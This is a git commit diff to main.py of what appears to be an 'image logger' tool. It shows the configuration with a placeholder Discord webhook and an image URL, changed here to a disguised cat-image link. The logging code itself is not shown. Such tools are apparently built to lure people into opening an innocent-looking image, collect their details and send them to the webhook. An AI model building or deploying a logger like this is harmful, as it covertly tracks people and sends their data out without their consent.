ab62303609fadbcb2ef797bb133c42e429ea86ee
jimmyyesskib <isaacpropascual@gmail.com>
2025-06-17 16:06:41 -0700

    Update main.py

--- main.py
+++ main.py
@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "image": "https://vercel.com/okdaves-projects/cats.jpg/https:/catsjpg.vercel.app/image.py/image", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
